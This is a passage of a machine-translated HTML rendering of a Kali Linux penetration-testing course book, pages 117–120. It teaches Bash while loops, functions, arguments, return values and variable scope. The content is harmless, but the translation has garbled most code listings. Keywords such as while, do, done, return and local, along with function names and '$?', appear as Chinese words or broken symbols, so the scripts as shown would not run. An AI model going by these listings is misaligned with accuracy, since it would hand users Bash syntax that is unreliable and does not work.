<div style="position:absolute;top:138797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面的例子，我们使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-lt</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（小于）而不是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-le</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（小于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或等于</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">），所以我们的计数器只得到</font></font></nobr></div>
<div style="position:absolute;top:138816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到九个，而不是原先预期的十个。</font></font></nobr></div>
<div style="position:absolute;top:138849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（（计数器++））</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">行使用双括号</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（（））</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">130</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构建来执行算术</font></font></nobr></div>
<div style="position:absolute;top:138869;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">同时进行扩展和评估。</font><font style="vertical-align: inherit;">在这种特殊情况下，我们用它来增加我们的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计数器</font></font></i></nobr></div>
<div style="position:absolute;top:138888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个变量。</font><font style="vertical-align: inherit;">让我们重新编写</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">while</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环并再次尝试示例：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:138923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./while2.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:138940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:138957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># while 循环示例 2</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:139023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">129 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（堆栈溢出，2019 年），https://stackoverflow.com/questions/2939869/what-is-exactly-the-off-by-one-errors-in-the-while-loop</font></font></font></nobr></div>
<div style="position:absolute;top:139043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">130 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（高级 Bash 脚本指南，2014 年），http://tldp.org/LDP/abs/html/dblparens.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:139171;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="118"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 118 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:139204;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:140281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:140281;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:140281;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">118</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:139316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计数器=1</font></font></nobr></div>
<div style="position:absolute;top:139350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">而 [ $counter -le 10 ]</font></font></nobr></div>
<div style="position:absolute;top:139368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">做</font></font></nobr></div>
<div style="position:absolute;top:139384;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "10.11.1.$counter"</font></font></nobr></div>
<div style="position:absolute;top:139401;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（（计数器++））</font></font></nobr></div>
<div style="position:absolute;top:139418;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完毕</font></font></nobr></div>
<div style="position:absolute;top:139452;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./while2.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:139486;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./while2.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:139503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.1</font></font></nobr></div>
<div style="position:absolute;top:139520;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.2</font></font></nobr></div>
<div style="position:absolute;top:139537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.3</font></font></nobr></div>
<div style="position:absolute;top:139554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.4</font></font></nobr></div>
<div style="position:absolute;top:139571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.5</font></font></nobr></div>
<div style="position:absolute;top:139588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.6</font></font></nobr></div>
<div style="position:absolute;top:139605;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.7</font></font></nobr></div>
<div style="position:absolute;top:139622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.8</font></font></nobr></div>
<div style="position:absolute;top:139639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.9</font></font></nobr></div>
<div style="position:absolute;top:139656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.10</font></font></nobr></div>
<div style="position:absolute;top:139675;left:313"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 162 - 在 Bash 中使用 while 循环的示例</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:139705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">好的。</font><font style="vertical-align: inherit;">我们的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">while</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环现在看起来好多了。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:139742;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5.6 功能</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:139784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Bash 脚本方面，我们可以将函数视为脚本中的脚本，这很有用</font></font></nobr></div>
<div style="position:absolute;top:139803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们需要在脚本中多次执行相同的代码时。</font><font style="vertical-align: inherit;">而不是重新编写相同的</font></font></nobr></div>
<div style="position:absolute;top:139822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一遍又一遍的代码块，我们只需将它作为函数编写一次，然后将该函数调用为</font></font></nobr></div>
<div style="position:absolute;top:139842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要。</font></font></nobr></div>
<div style="position:absolute;top:139874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">换句话说，一个函数是一个子程序，或者一个实现一组操作的代码块——一个</font></font></nobr></div>
<div style="position:absolute;top:139894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行指定任务的“黑匣子”。</font><font style="vertical-align: inherit;">函数可以用两种不同的格式编写。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:139913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一种格式在 Bash 脚本中更常见：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:139948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数函数名称{</font></font></nobr></div>
<div style="position:absolute;top:139965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令...</font></font></nobr></div>
<div style="position:absolute;top:139982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:140001;left:316"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 163 - 在 Bash 中编写函数的一种方式</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C 程序员更熟悉第二种格式：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:140066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数名称（）{</font></font></nobr></div>
<div style="position:absolute;top:140083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令...</font></font></nobr></div>
<div style="position:absolute;top:140099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:140119;left:304"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 164 - 在 Bash 中编写函数的另一种方式</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140148;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些格式在功能上是相同的，这取决于个人喜好。</font><font style="vertical-align: inherit;">我们来看一个简单的</font></font></nobr></div>
<div style="position:absolute;top:140168;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:140202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./func.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:140219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:140359;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="119"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 119 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:140392;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:141469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:141469;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:141469;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">119</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:140488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 函数示例</font></font></nobr></div>
<div style="position:absolute;top:140521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印_我（）{</font></font></nobr></div>
<div style="position:absolute;top:140538;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "你被打印出来了！"</font></font></nobr></div>
<div style="position:absolute;top:140556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:140589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印_我</font></font></nobr></div>
<div style="position:absolute;top:140623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./func.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:140657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./func.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:140674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">你被打印出来了！</font></font></nobr></div>
<div style="position:absolute;top:140694;left:265"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 165 - 使用 Bash 函数将消息打印到屏幕</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140723;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数也可以接受参数：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:140758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./funcarg.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:140775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:140792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 将参数传递给函数</font></font></nobr></div>
<div style="position:absolute;top:140826;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pass_arg() {</font></font></nobr></div>
<div style="position:absolute;top:140843;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "今天的随机数是：$1"</font></font></nobr></div>
<div style="position:absolute;top:140860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:140894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pass_arg $RANDOM</font></font></nobr></div>
<div style="position:absolute;top:140927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./funcarg.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:140962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./funcarg.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:140979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">今天的随机数是：25207</font></font></nobr></div>
<div style="position:absolute;top:140998;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 166 - 在 Bash 中将参数传递给函数</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:141027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们将一个随机数</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$RANDOM</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传递给</font><font style="vertical-align: inherit;">函数，该函数将其输出为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$1</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，即</font></font></nobr></div>
<div style="position:absolute;top:141047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数第一个参数。</font><font style="vertical-align: inherit;">请注意，函数定义 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pass_arg()</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 包含括号。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:141066;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他编程语言，如 C，这些将包含预期的参数，但在</font></font></nobr></div>
<div style="position:absolute;top:141085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bash 括号仅用作装饰。</font><font style="vertical-align: inherit;">它们从不使用。</font><font style="vertical-align: inherit;">还要注意函数</font></font></nobr></div>
<div style="position:absolute;top:141104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定义（函数本身）必须在调用之前出现在脚本中。</font><font style="vertical-align: inherit;">从逻辑上讲，我们不能打电话</font></font></nobr></div>
<div style="position:absolute;top:141124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还没有定义的东西。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:141186;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用描述函数用途的描述性函数名称。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:141248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了向 Bash 函数传递参数之外，我们当然可以从 Bash 返回值</font></font></nobr></div>
<div style="position:absolute;top:141268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能一样。</font><font style="vertical-align: inherit;">Bash 函数实际上不允许您在</font></font></nobr></div>
<div style="position:absolute;top:141287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传统意义上。</font><font style="vertical-align: inherit;">相反，Bash 函数可以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出状态（成功为零，非零为</font></font></nobr></div>
<div style="position:absolute;top:141306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">失败）或其他一些我们以后可以从</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$? </font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局变量（见表</font></font></nobr></div>
<div style="position:absolute;top:141326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4）。</font><font style="vertical-align: inherit;">或者，我们可以在函数内部设置一个全局变量或使用命令替换来</font></font></nobr></div>
<div style="position:absolute;top:141345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模拟传统的回报。</font></font></nobr></div>
<div style="position:absolute;top:141378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们看一个简单的例子，它把一个随机数返回到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$? </font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:141547;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="120"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 120 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:141580;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:142657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:142657;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:142657;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">120</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:141678;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat funcrvalue.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:141695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:141712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># 函数返回值示例</font></font></nobr></div>
<div style="position:absolute;top:141746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回_我（）{</font></font></nobr></div>
<div style="position:absolute;top:141763;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo “哦，你好，我正在返回一个随机值！”</font></font></nobr></div>
<div style="position:absolute;top:141780;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回 $RANDOM</font></font></nobr></div>
<div style="position:absolute;top:141796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:141831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回_我</font></font></nobr></div>
<div style="position:absolute;top:141865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo "前一个函数返回了 $ 值？"</font></font></nobr></div>
<div style="position:absolute;top:141898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chmod +x ./funcrvalue.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:141932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./funcrvalue.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:141949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哦，你好，我正在返回一个随机值！</font></font></nobr></div>
<div style="position:absolute;top:141966;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上一个函数返回值 198</font></font></nobr></div>
<div style="position:absolute;top:142000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">./funcrvalue.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:142017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哦，你好，我正在返回一个随机值！</font></font></nobr></div>
<div style="position:absolute;top:142034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上一个函数返回值 313</font></font></nobr></div>
<div style="position:absolute;top:142054;left:304"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 167 - 从 Bash 中的函数返回一个值</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:142083;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，每次运行脚本时都会返回一个随机数，因为我们返回了</font></font></nobr></div>
<div style="position:absolute;top:142102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特殊的全局变量 $RANDOM（进入</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$?</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">如果我们使用</font><font style="vertical-align: inherit;">没有 $RANDOM</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">return</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句</font></font></nobr></div>
<div style="position:absolute;top:142121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数，函数的退出状态（</font><font style="vertical-align: inherit;">在本例中为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）将被返回。</font></font></nobr></div>
<div style="position:absolute;top:142154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们对变量和函数有了基本的了解，我们可以更深入地讨论</font></font></nobr></div>
<div style="position:absolute;top:142174;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量范围</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">131</font></font></font></nobr></div>
<div style="position:absolute;top:142206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量的作用域只是它有意义的上下文。</font><font style="vertical-align: inherit;">默认情况下，一个变量有一个</font></font></nobr></div>
<div style="position:absolute;top:142226;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">范围，这意味着它可以在整个脚本中访问。</font><font style="vertical-align: inherit;">相比之下，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">局部</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量</font></font></nobr></div>
<div style="position:absolute;top:142245;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只能在定义它的函数、代码块或子shell 中看到。</font><font style="vertical-align: inherit;">我们可以</font></font></nobr></div>
<div style="position:absolute;top:142264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“覆盖”一个全局变量，给它一个局部上下文，通过在声明之前加上</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">局部</font></font></i></nobr></div>
<div style="position:absolute;top:142284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关键字，保持全局变量不变。</font><font style="vertical-align: inherit;">一般语法是：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:142319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地名称=“乔”</font></font></nobr></div>
<div style="position:absolute;top:142338;left:351"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 168 - 声明一个局部变量</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:142368;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们</font><font style="vertical-align: inherit;">通过一个简单的例子来</font><font style="vertical-align: inherit;">看看</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">局部</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量</font><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量在实践中是</font><font style="vertical-align: inherit;">如何</font><font style="vertical-align: inherit;">工作的：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:142402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat ./varscope.sh</font></font></font></b></nobr></div>
<div style="position:absolute;top:142419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:142436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"># var 作用域示例</font></font></nobr></div>
